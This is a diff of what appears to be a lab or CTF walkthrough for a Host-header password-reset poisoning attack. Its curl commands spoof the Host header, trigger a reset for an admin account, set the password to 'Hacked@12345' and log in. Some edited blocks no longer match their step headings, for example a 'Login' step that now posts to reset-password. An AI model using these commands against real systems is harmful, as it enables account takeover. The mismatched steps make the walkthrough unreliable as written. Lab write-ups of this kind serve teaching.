@@ -60,7 +60,7 @@ The vulnerability: the application uses `request.headers.get('Host')` to constru
 **Craft the malicious request:**
 ```bash
 curl -s -X POST http://203.x.x.x:8080/forgot-password \
-  -H "Host: attacker.com" \
+  -H "Host: 127.0.0.1" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "email=admin@prabalurja.in"
 ```
@@ -97,9 +97,10 @@ http://203.0.x.x:8080/reset-password?token=<TOKEN_VALUE>
 
 Or via curl:
 ```bash
-curl -s -X POST "http://203.x.x.x:8080/reset-password" \
+curl -s -X POST http://203.0.1.229:8080/forgot-password \
+  -H "Host: 127.0.0.1" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "token=<TOKEN_VALUE>&new_password=Hacked@12345"
+  -d "email=admin@prabalurja.in"
 ```
 
 <img width="1345" height="769" alt="image" src="https://github.com/user-attachments/assets/d7ff6ac6-3a46-442b-8f53-67b8be184cd4" />
@@ -110,9 +111,10 @@ A success message confirms the password has been updated.
 ### Step 6 — Login as Admin
 
 ```bash
-curl -s -c cookies.txt -X POST http://203.0.x.x:8080/login \
+curl -i -s -X POST http://203.0.1.229:8080/reset-password \
+  -H "Host: 127.0.0.1" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "email=admin@prabalurja.in&password=Hacked@12345"
+  -d "token=<TOKEN>&new_password=Hacked@12345"
 ```
 
 Or log in via browser. The admin dashboard loads.
